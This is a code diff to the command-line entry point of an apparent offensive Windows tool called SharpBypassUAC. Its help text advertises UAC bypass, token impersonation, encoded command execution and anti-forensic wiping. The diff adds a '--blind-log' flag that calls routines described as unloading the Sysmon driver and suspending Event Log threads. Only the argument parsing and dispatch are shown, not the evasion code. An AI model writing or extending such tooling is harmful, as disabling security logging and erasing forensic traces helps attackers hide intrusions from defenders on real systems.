@@ -30,6 +30,7 @@ namespace SharpBypassUAC
             Console.WriteLine("  -t <pid>      Impersonate token from target process (requires local admin)");
             Console.WriteLine("  -e <base64>   Base64-encoded command to execute");
             Console.WriteLine("  -c            Anti-forensic cleanup (ETW patch, Prefetch/ShimCache/BAM wipe, self-delete)");
+            Console.WriteLine("  --blind-log   Sysmon evasion (unload SysmonDrv + suspend EventLog threads)");
             Console.WriteLine("  -h            Show this help");
             Console.WriteLine();
             Console.WriteLine("Examples:");
@@ -46,6 +47,7 @@ namespace SharpBypassUAC
             int targetPid = -1;
             bool help = false;
             bool cleanup = false;
+            bool blindLog = false;
 
             for (int i = 0; i < args.Length; i++)
             {
@@ -73,6 +75,10 @@ namespace SharpBypassUAC
                 else if (arg == "-c" || arg == "--clean")
                 {
                     cleanup = true;
+                }
+                else if (arg == "--blind-log")
+                {
+                    blindLog = true;
                 }
             }
 
@@ -114,6 +120,12 @@ namespace SharpBypassUAC
                 }
                 catch { }
                 AntiForensic.RunLight(selfPath);
+            }
+
+            if (blindLog)
+            {
+                SysmonEvasion.R1();
+                SysmonEvasion.R2();
             }
 
             try
